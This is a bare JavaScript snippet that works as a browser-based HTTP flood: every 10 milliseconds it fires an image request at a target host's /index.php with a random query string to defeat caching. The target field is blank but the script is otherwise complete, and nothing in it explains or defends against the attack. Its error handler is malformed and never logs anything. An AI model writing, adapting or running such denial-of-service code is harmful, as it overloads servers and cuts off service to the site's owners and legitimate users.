function floodImagesXYZ() {
  var TARGET = "";
  var URI = "/index.php?";
  var pic = new Image();
  var rand = Math.floor(Math.random() * 10000000000000000000000);
  try {
    pic.src = "http://" + TARGET + URI + rand + "=val";

  } catch {
    (error) => {
      console.log(error);
      console.log("Error in:",URI);
    };
  }
}
setInterval(floodImagesXYZ, 10);
